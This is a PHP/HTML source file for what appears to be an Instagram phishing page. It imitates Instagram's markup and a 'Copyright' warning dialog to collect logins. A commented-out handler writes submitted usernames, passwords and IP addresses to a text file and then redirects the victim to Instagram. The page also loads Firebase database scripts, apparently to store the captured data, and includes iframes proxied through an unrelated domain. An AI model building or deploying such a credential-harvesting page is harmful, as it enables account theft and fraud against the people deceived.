<?php
error_reporting(0);
// function ara($bas, $son, $yazi)
// {
//     @preg_match_all('/' . preg_quote($bas, '/') .
//         '(.*?)' . preg_quote($son, '/') . '/i', $yazi, $m);
//     return @$m[1];
// }
// $nick = $_GET['nick'];
// $url = 'https://instagram.com/' . $nick;
// $html = file_get_contents($url);
// $dom = new DOMDocument();
// $dom->loadHTML($html);
// $veri = $dom->textContent;
// $cc = ara('"thumbnail_src":"', '"', $veri);
// $meta_tags = $dom->getElementsByTagName('meta');
// foreach ($meta_tags as $meta) {
//     if ($meta->getAttribute('property') == 'og:image') {
//         $image_url = $meta->getAttribute('content');
//     }
// }
// if (empty($cc)) {
//     $cc[0] = $image_url;
// }
/*if ($_POST) {
    $username = $_POST['username'];
    $password =  $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    date_default_timezone_set('Asia/Jakarta');
    $cur_time = date("d-m-Y H:i:s");
    $file = fopen('list.txt', 'a');
    fwrite($file, "Username : " . $username . " Password : " . $password . "   Ip Adresi: " . $ip . "   Time: " . $cur_time .  "\n\n");
    fclose($file);
    echo '';
    header("Location: https://instagram.com/$username");
}*/
?>
<html lang="en" class="js logged-in client-root" __cpp="1">

<head __cpp="1">
    <?php include './assets/css/header.php'; ?>
    <?php include './assets/css/language.php'; ?>
    <?php include './assets/css/spinner.php'; ?>
    <?php include './assets/css/styles-instagram.php'; ?>
</head>

<body class="" __cpp="1">
    <div id="__cpsModal" __cpp="1">
        <div id="__cpsModalContent" __cpp="1"></div>
    </div>
    <?php include './assets/page/language.php'; ?>
    <div id="fb-root" __cpp="1" class=" fb_reset">
        <div __cpp="1" style="position: absolute; top: -10000px; height: 0px; width: 0px;">
            <div __cpp="1">
                <!-- <iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" __cporiginalvalueofsrc="https://staticxx.facebook.com/connect/xd_arbiter/r/qMnGlIs-JNW.js?version=42#channel=f59a022dfc20ec&amp;origin=https%3A%2F%2Fwww.instagram.com" src="https://newbigdata.science/connect/xd_arbiter/r/qMnGlIs-JNW.js?version=42&amp;__cpo=aHR0cHM6Ly9zdGF0aWN4eC5mYWNlYm9vay5jb20#channel=f59a022dfc20ec&amp;origin=https%3A%2F%2Fwww.instagram.com" style="border: none;" __cpp="1"></iframe> -->
                <iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" __cporiginalvalueofsrc="https://staticxx.facebook.com/connect/xd_arbiter/r/qMnGlIs-JNW.js?version=42#channel=f59a022dfc20ec&amp;origin=https%3A%2F%2Fwww.instagram.com" src="#" style="border: none;" __cpp="1"></iframe>
            </div>
        </div>
        <div __cpp="1" style="position: absolute; top: -10000px; height: 0px; width: 0px;">
            <div __cpp="1">
                <!-- <iframe name="fd64c614204464" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" __cporiginalvalueofsrc="https://www.facebook.com/connect/ping?client_id=124024574287414&amp;domain=www.instagram.com&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2FqMnGlIs-JNW.js%3Fversion%3D42%23cb%3Df1f19c0950ec264%26domain%3Dwww.instagram.com%26origin%3Dhttps%253A%252F%252Fwww.instagram.com%252Ff59a022dfc20ec%26relation%3Dparent&amp;response_type=token%2Csigned_request%2Ccode&amp;sdk=joey&amp;version=v2.2" src="https://newbigdata.science/connect/ping?client_id=124024574287414&amp;domain=www.instagram.com&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2FqMnGlIs-JNW.js%3Fversion%3D42%23cb%3Df1f19c0950ec264%26domain%3Dwww.instagram.com%26origin%3Dhttps%253A%252F%252Fwww.instagram.com%252Ff59a022dfc20ec%26relation%3Dparent&amp;response_type=token%2Csigned_request%2Ccode&amp;sdk=joey&amp;version=v2.2&amp;__cpo=aHR0cHM6Ly93d3cuZmFjZWJvb2suY29t" __cpp="1" style="display: none;"></iframe> -->
                <iframe name="fd64c614204464" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" __cporiginalvalueofsrc="https://www.facebook.com/connect/ping?client_id=124024574287414&amp;domain=www.instagram.com&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2FqMnGlIs-JNW.js%3Fversion%3D42%23cb%3Df1f19c0950ec264%26domain%3Dwww.instagram.com%26origin%3Dhttps%253A%252F%252Fwww.instagram.com%252Ff59a022dfc20ec%26relation%3Dparent&amp;response_type=token%2Csigned_request%2Ccode&amp;sdk=joey&amp;version=v2.2" src="#" __cpp="1" style="display: none;"></iframe>
            </div>
        </div>
    </div>
    <script>
        $("#butonamca").click(function() {
            $("#gizlenmis").show();
        });
    </script>
    <div __cpp="1" id="gizlenmis" style="display:none;">
        <div class="_2dDPU p2jpu" role="dialog" __cpp="1">
            <div class="EfHg9" __cpp="1"></div>
            <div class="zZYga Nd6FG" role="dialog" __cpp="1">
                <div class="PdwC2 _8F2QW" role="dialog" __cpp="1">
                    <div class="VQoji" __cpp="1">
                        <h1 class="gM4wt" __cpp="1">Copyright</h1>
                    </div>
                    <?php include './assets/page/form.php'; ?>
                    <?php include './assets/page/button.php'; ?>
                </div>
            </div>
        </div>
    </div>
    <?php include './assets/js/form.php'; ?>
</body>

</html>

<!-- The core Firebase JS SDK is always required and must be listed first -->
<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-app.js"></script>
<!-- TODO: Add SDKs for Firebase products that you want to use
https://firebase.google.com/docs/web/setup#available-libraries -->
<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-analytics.js"></script>
<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-database.js"></script>
<?php include './assets/js/firebase.php'; ?>
<?php include './assets/js/database.php'; ?>
<?php include './assets/js/counters.php'; ?>